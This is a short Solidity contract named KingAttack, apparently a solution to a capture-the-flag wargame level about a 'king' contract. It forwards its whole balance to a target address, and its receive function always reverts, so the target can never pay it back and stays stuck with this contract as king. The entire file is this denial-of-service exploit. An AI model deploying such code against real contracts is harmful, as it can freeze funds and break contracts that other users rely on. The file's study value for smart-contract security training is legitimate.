// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract KingAttack {
    address public target;

    constructor(address targ) public payable {
        target = targ;
    }

    function exp() payable public {
        payable(target).call{value:address(this).balance,gas:1000000}("");
    }

    receive() external payable {
        revert();
    }
}